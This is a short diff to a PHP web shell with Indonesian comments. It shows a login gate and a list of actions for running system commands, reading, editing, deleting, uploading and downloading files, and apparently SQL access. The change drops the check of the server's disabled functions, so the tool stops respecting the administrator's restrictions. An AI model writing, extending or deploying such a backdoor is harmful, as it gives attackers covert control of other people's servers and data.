@@ -104,12 +104,7 @@ if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
 //            Indonesia.
 // ===========================================================================
 // Array fungsi yang dinonaktifkan (jika ada)
-$nami = [];
-$disabled_functions = ini_get('disable_functions');
-if (!empty($disabled_functions)) {
-    $nami = explode(",", $disabled_functions);
-}
-
+$nami = explode(",", (string) "");
 $safeMode = true;
 // Daftar aksi yang diperbolehkan
 $actions = array("dasar","baca_file","phpinfo","sistem_kom","edit_file","download_file",'hapus_file','buat_file','buat_folder','reset_file' , 'hapus_folder','rename_file', 'kompres' , 'skl' , 'skl_d_t' , 'skl_d', 'upl_file');
